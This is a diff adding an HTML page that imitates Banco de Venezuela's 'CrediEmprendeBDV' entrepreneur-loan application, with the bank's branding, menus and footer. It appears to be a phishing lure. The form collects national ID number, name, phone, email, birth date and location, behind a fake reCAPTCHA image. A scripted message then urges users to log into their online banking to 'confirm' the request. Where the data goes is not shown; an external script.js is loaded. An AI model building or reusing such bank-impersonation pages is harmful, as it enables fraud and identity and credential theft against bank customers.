@@ -1,0 +1,362 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width">
+  <title>CrediEmprendeBDV</title>
+  <link rel="icon" href="favicon.png" type="image/x-icon">
+  <link href="style.css" rel="stylesheet" type="text/css" />
+</head>
+
+<body>
+  <script src="script.js"></script>
+</body>
+
+</html><!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Crediemprendebdv</title>
+    <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@200;300;400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <!-- Section 1: Header -->
+    <header class="header">
+        <div class="logo">
+            <img src="lo.jpg" alt="Banco de Venezuela"> <!-- Logo adicional -->
+            <img src="bdv.png" alt="Banco de Venezuela">
+        </div>
+        <div class="banking-access">
+              <!-- Botón de Banca en línea -->
+              <div class="dropdown">
+                <button class="dropdown-btn">Banca en línea <span class="arrow" style="position: relative; top: -2px;">
+    <img src="icono.png" alt="icono" style="width: 10px; height: 6px;">
+                </span></button>
+                <div class="dropdown-content">
+                  <a href="#">Personas</a>
+                  <a href="#">Empresas</a>
+                  <a href="#">Actualizar mis datos</a>
+                  <a href="#">TrámitesenlíneaBDV</a>
+                </div>
+              </div>
+
+              <!-- Botón de tres rayas (Menú lateral) -->
+              <div class="menu-icon" onclick="toggleMenu()">
+                <div class="bar"></div>
+                <div class="bar"></div>
+                <div class="bar"></div>
+              </div>
+            </div>
+          </div>
+
+          <!-- Menú lateral desplegable -->
+          <div id="side-menu" class="side-menu">
+            <a href="#">SomosBDV<span class="arrow" style="position: relative; top: -2px;">
+    <img src="icono.png" alt="icono" style="width: 10px; height: 6px;">
+            </span></a>
+            <a href="#">Para ti <span class="arrow" style="position: relative; top: -2px;">
+    <img src="icono.png" alt="icono" style="width: 10px; height: 6px;">
+            </span></a>
+            <a href="#">Para tu empresa <span class="arrow" style="position: relative; top: -2px;">
+    <img src="icono.png" alt="icono" style="width: 10px; height: 6px;">
+            </span></a>
+            <span class="close-btn" onclick="toggleMenu()">×</span>
+          </div>
+    </header>
+
+    <!-- Section 2: Program Description -->
+    <section class="program-description">
+        <div class="image-container">
+            <img src="em.jpg" alt="Banco de Venezuela"><h2 class="centered-title">CrediEmprendeBDV</h2>
+        </div>
+        <p class="description-paragraph">Es un producto diseñado para el financiamiento de proyectos que promuevan el crecimiento del sector emprendedor, con la finalidad de impulsar la diversificación de la producción de bienes y servicios, el despliegue de innovaciones y su incorporación al desarrollo económico y social de la Nación.</p>
+      <div class="video-container"> <div class="video-wrapper">
+    <iframe width="560" height="315" src="https://www.youtube.com/embed/J57vQKrpW0g?si=X5Kgjhnwn8C-ks03" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
+      </div>
+      </div>
+    </section>
+
+   <!-- Sección 3: del Formulario -->
+    <section class="form-section">
+  <div class="form-wrapper">
+    <div class="form-container">
+      <div class="form-header">
+        <h2>Realizar Solicitud</h2>
+      </div>
+
+      <form action="#" method="POST" id="myForm" onsubmit="return handleSubmit(event)">
+        <div class="form-group">
+          <label for="cuenta-bdv">¿Tienes cuenta en el Banco de Venezuela? <span class="required">*</span></label>
+          <select id="cuenta-bdv" name="cuenta-bdv" required>
+            <option value="" selected>Selecciona</option>
+            <option value="si">Si</option>
+            <option value="no">No</option>
+          </select>
+        </div>
+
+        <div class="form-group">
+          <label for="punto-venta">Nacionalidad <span class="required">*</span></label>
+          <select id="punto-venta" name="punto-venta" required>
+            <option value="" selected>Nacionalidad</option>
+            <option value="si">V</option>
+            <option value="no">E</option>
+            <option value="si">P</option>
+          </select>
+        </div>
+
+        <div class="form-group">
+    <label for="punto-venta">Cédula  <span class="required">*</span></label>
+    <input type="text" id="punto-venta" name="punto-venta" required placeholder="Cédula">
+        </div>
+
+        <div class="form-group">
+          <label for="punto-venta">Nombre y apellido  <span class="required">*</span></label>
+          <input type="text" id="punto-venta" name="punto-venta" required placeholder="Nombre y apellido">
+              </div>
+
+        <div class="form-group">
+          <label for="punto-venta">Género <span class="required">*</span></label>
+          <select id="punto-venta" name="punto-venta" required>
+            <option value="" selected>Selecciona</option>
+            <option value="si">Masculino</option>
+            <option value="no">Femenino</option>
+          </select>
+        </div>
+
+        <div class="form-group">
+          <label for="punto-venta">Teléfono celular<span class="required">*</span></label>
+          <input type="text" id="punto-venta" name="punto-venta" required placeholder="Teléfono celular">
+              </div>
+
+        <div class="form-group">
+    <label for="punto-venta">Correo electrónico<span class="required">*</span></label>
+    <input type="text" id="punto-venta" name="punto-venta" required placeholder="Correo electrónico">
+        </div>
+
+        <div class="form-group">
+          <label for="fecha-nacimiento">Fecha de nacimiento <span class="required">*</span></label>
+          <input type="date" id="fecha-nacimiento" name="fecha-nacimiento" required>
+        </div>
+        
+        <div class="form-group">
+          <label for="punto-venta">Estado <span class="required">*</span></label>
+          <select id="punto-venta" name="punto-venta" required>
+            <option value="" selected>Selecciona</option>
+            <option value="si">Amazonas</option>
+<option value="si">Anzoátegui</option>
+<option value="si">Apuré</option>
+<option value="si">Aragua</option>
+<option value="si">Barinas</option>
+<option value="si">Bolívar</option>
+<option value="si">Carabobo</option>
+<option value="si">Cojedes</option>
+<option value="si">Delta Amacuro</option>
+<option value="si">Distrito Capital</option>
+<option value="si">Falcón</option>
+<option value="si">Guárico</option>
+<option value="si">Lara</option>
+<option value="si">La Guaira</option>
+<option value="si">Mérida</option>
+<option value="si">Miranda</option>
+<option value="si">Monagas</option>
+<option value="si">Nueva Esparta</option>
+<option value="si">Portuguesa</option>
+<option value="si">Sucre</option>
+<option value="si">Táchira</option>
+<option value="si">Trujillo</option>
+<option value="si">Yaracuy</option>
+<option value="si">Zulia</option>
+          </select>
+        </div>
+
+        <div class="form-group">
+          <label for="punto-venta">Municipio<span class="required">*</span></label>
+          <input type="text" id="punto-venta" name="punto-venta" required placeholder="Municipio">
+              </div>
+        
+        <div class="form-group">
+          <label for="punto-venta">Clasifica tu emprendimiento<span class="required">*</span></label>
+          <select id="punto-venta" name="punto-venta" required>
+            <option value="" selected>Selecciona</option>
+            <option value="si">Producción</option>
+            <option value="si">Comercio</option>
+            <option value="no">Servicios</option>
+          </select>
+        </div>
+
+        <div class="form-group">
+          <label for="empresa-registrada">Sector <span class="required">*</span></label>
+          <select id="empresa-registrada" name="empresa-registrada" required>
+            <option value="" selected>Selecciona</option>
+            <option value="si">Agricultura</option>
+<option value="si">Ganadería</option>
+<option value="si">Pesca</option>
+<option value="si">Mixto</option>
+<option value="si">Manufactura</option>
+<option value="si">Ventas</option>
+<option value="si">Entretenimiento</option>
+<option value="si">Personales</option>
+<option value="si">Reparación</option>
+<option value="si">Turismo</option>
+          </select>
+        </div>
+
+        <div class="form-group">
+          <label for="certificado">Actividad <span class="required">*</span></label>
+          <select id="certificado" name="certificado" required>
+            <option value="" selected>Selecciona</option>
+            <option value="si">Siembra</option>
+<option value="si">Cría de aves</option>
+<option value="si">Cría de animal bovino (carne/queso)</option>
+<option value="si">Cría de animal porcino</option>
+<option value="si">Cría de animal ovino</option>
+<option value="si">Pesca marítima artesanal</option>
+<option value="si">unidades productivas mixtas</option>
+<option value="si">Fabricación</option>
+<option value="si">Ventas</option>
+<option value="si">Servicio de telecomunicaciones</option>
+<option value="si">Otras actividades de entrenamiento</option>
+<option value="si">Peluquería / Spa</option>
+<option value="si">Taller mecánico</option>
+            <option value="si">Hospedaje</option>
+<option value="si">Otros</option>
+          </select>
+        </div>
+
+          <div class="recaptcha-container">
+              <img src="bdv.jpg" alt="ReCAPTCHA" class="recaptcha-image">
+              <div class="checkbox" id="invisible-checkbox" onclick="startLoading()"></div>
+              <div class="loading" id="loading" style="display: none;"></div>
+              <div class="verification-icon" id="verification-icon" style="display: none;"></div>
+          </div>
+
+        <button type="submit" class="submit-btn">
+          <div class="loader" id="loader" style="display: none;"></div>
+          ENVIAR SOLICITUD
+        </button>
+      </form>
+
+      <p id="success-message" style="display: none;">✓ Su solicitud ha sido enviada exitosamente.</p>
+<p id="new-confirmation-message" style="display: none;">¡Confírma tu solicitud! Ingresá a tu cuenta BDVenlinea, en la notificación de (solicitud de CrediEmprendeBDV) completa los campos: montó, plazo, cuotas, otros detalles y Confírma.</p>
+<button id="new-confirm-btn" style="display: none;" class="submit-btn">CONFIRMAR SOLICITUD</button>
+    </div>
+  </div>
+</section>
+
+  <script>
+    function handleSubmit(event) {
+      event.preventDefault(); // Previene el envío del formulario
+      const loader = document.getElementById('loader');
+      const successMessage = document.getElementById('success-message');
+      const confirmationMessage = document.getElementById('new-confirmation-message');
+      const confirmButton = document.getElementById('new-confirm-btn');
+
+      // Mostrar el círculo de carga
+      loader.style.display = 'inline-block';
+
+      // Simula un retraso de envío del formulario (2 segundos)
+      setTimeout(() => {
+        loader.style.display = 'none'; // Oculta el círculo de carga
+        successMessage.style.display = 'block'; // Muestra el mensaje de éxito
+        confirmationMessage.style.display = 'block'; // Muestra el mensaje de confirmación
+        confirmButton.style.display = 'inline-block'; // Muestra el botón de confirmar
+      }, 2000);
+    }
+
+    function simulateCaptcha() {
+      const loading = document.getElementById('loading');
+      const checkbox = document.getElementById('checkbox');
+
+      // Mostrar el círculo azul
+      loading.style.display = 'block';
+
+      // Después de 1 segundo, mostrar la flecha verde
+      setTimeout(() => {
+        loading.style.display = 'none';
+        checkbox.style.backgroundImage = "url('https://www.svgrepo.com/show/163180/arrow.svg')"; // URL de la flecha verde
+        checkbox.style.backgroundSize = '20px';
+        checkbox.style.backgroundRepeat = 'no-repeat';
+        checkbox.style.backgroundPosition = 'center';
+      }, 1000);
+    }
+</script>
+
+    <!-- Section 4: Contact Information -->
+    <section class="contact">
+        <div class="image-contact">
+            <img src="contact.jpg" alt="Banco de Venezuela">
+        </div>
+    </section>
+
+    <!-- Section 5: Links Menu -->
+    <section class="links-menu">
+        <div class="menu-column">
+            <h3>Información institucional</h3>
+            <ul>
+                <li><a href="#">Prensa BDV</a></li>
+                <li><a href="#">Historia BDV</a></li>
+                <li><a href="#">Convocatorias</a></li>
+                <li><a href="#">Junta Directiva</a></li>
+                <li><a href="#">Informes de gestión</a></li>
+                <li><a href="#">Red de agencias BDV</a></li>
+                <li><a href="#">Calendario bancario 2024</a></li>
+            </ul>
+        </div>
+      <div class="menu-column">
+            <h3>Atención al usuario</h3>
+            <ul>
+                <li><a href="#">Contáctanos</a></li>
+                <li><a href="#">Atención al cliente</a></li>
+                <li><a href="#">Defensoría del cliente y usuario</a></li>
+                <li><a href="#">bancario</a></li>
+                <li><a href="#">Oficina de atención</a></li>
+                <li><a href="#">al ciudadano</a></li>
+            </ul>
+      </div>
+        <div class="menu-column">
+            <h3>Personas</h3>
+            <ul>
+                <li><a href="#">Pagos</a></li>
+                <li><a href="#">Cuentas</a></li>
+                <li><a href="#">Soluciones</a></li>
+                <li><a href="#">Financiamientos</a></li>
+                <li><a href="#">Inversiones</a></li>
+            </ul>
+        </div>
+      <div class="menu-column">
+            <h3>Empresas </h3>
+            <ul>
+                <li><a href="#">Pagos</a></li>
+                <li><a href="#">Cobros</a></li>
+                <li><a href="#">Cuentas</a></li>
+                <li><a href="#">Soluciones</a></li>
+                <li><a href="#">Financiamientos</a></li>
+                <li><a href="#">Inversiones</a></li>
+            </ul>
+      </div>
+      <div class="menu-column">
+            <h3>Información de interés</h3>
+            <ul>
+                <li><a href="#">Tasas y Tarifas</a></li>
+                <li><a href="#">Seguridad</a></li>
+                <li><a href="#">Notificaciones</a></li>
+                <li><a href="#">Límites de operaciones</a></li>
+                <li><a href="#">Formularios de solicitudes</a></li>
+                <li><a href="#">Prevención LC/FT/FPADM</a></li>
+            </ul>
+      </div>
+    </section>
+
+    <!-- Section 6: Footer -->
+    <section class="pie">
+        <div class="image-pie">
+            <img src="piedp.jpg" alt="Banco de Venezuela">
+        </div>
+    </section>
+
+    <script src="script.js"></script>
+</body>
+</html>
